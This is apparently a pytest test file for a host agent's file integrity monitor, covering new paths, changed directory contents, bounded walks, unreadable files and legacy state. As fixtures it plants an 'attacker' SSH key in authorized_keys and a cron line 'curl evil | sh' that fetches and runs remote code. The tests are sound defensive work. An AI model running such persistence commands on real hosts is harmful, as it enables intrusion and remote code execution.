"""File integrity monitoring: new paths, directories and unreadable files."""

from __future__ import annotations

import json
from pathlib import Path

from argus.agent import fim


def test_fim_alerts_when_absent_path_appears(tmp_path: Path):
    target = tmp_path / "authorized_keys"
    state = tmp_path / "integrity.json"
    assert fim.check_integrity([str(target)], state).findings == []
    target.write_text("ssh-ed25519 AAAA attacker\n", encoding="utf-8")
    rules = [f.rule_id for f in fim.check_integrity([str(target)], state).findings]
    assert rules == ["fim.file-created"]


def test_fim_hashes_directory_contents(tmp_path: Path):
    d = tmp_path / "cron.d"
    d.mkdir()
    (d / "job").write_text("0 * * * * backup\n", encoding="utf-8")
    state = tmp_path / "integrity.json"
    assert fim.check_integrity([str(d)], state).findings == []
    (d / "job").write_text("0 * * * * curl evil | sh\n", encoding="utf-8")
    (d / "new").write_text("x\n", encoding="utf-8")
    findings = fim.check_integrity([str(d)], state).findings
    changed = [f for f in findings if f.rule_id == "fim.content-changed"]
    assert len(changed) == 1
    assert changed[0].metadata["modified"] == ["job"]
    assert changed[0].metadata["added"] == ["new"]


def test_fim_directory_walk_is_bounded(tmp_path: Path, monkeypatch):
    monkeypatch.setattr(fim, "MAX_DIR_ENTRIES", 3)
    d = tmp_path / "many"
    d.mkdir()
    for i in range(10):
        (d / f"f{i}").write_text("x", encoding="utf-8")
    rec = fim._hash_dir(d)
    assert rec["truncated"] and len(rec["entries"]) == 3


def test_fim_reports_unreadable_file(tmp_path: Path, monkeypatch):
    target = tmp_path / "shadow"
    target.write_text("secret\n", encoding="utf-8")
    monkeypatch.setattr(fim, "_hash_file", lambda p: (None, "Permission denied"))
    findings = fim.check_integrity([str(target)], tmp_path / "integrity.json").findings
    assert [f.rule_id for f in findings] == ["fim.unreadable"]
    assert "Permission denied" in findings[0].description


def test_fim_reads_legacy_state(tmp_path: Path):
    target = tmp_path / "cfg"
    target.write_text("v1\n", encoding="utf-8")
    state = tmp_path / "integrity.json"
    legacy = {str(target): {"hash": fim._hash_file(target)[0], "stat": fim._stat_sig(target)}}
    state.write_text(json.dumps(legacy), encoding="utf-8")
    assert fim.check_integrity([str(target)], state).findings == []
    target.write_text("v2\n", encoding="utf-8")
    assert [f.rule_id for f in fim.check_integrity([str(target)], state).findings] == [
        "fim.content-changed"
    ]
